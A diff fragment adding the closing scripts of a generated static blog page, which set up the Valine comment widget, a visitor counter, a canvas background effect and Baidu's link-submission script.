+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https'){
+  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
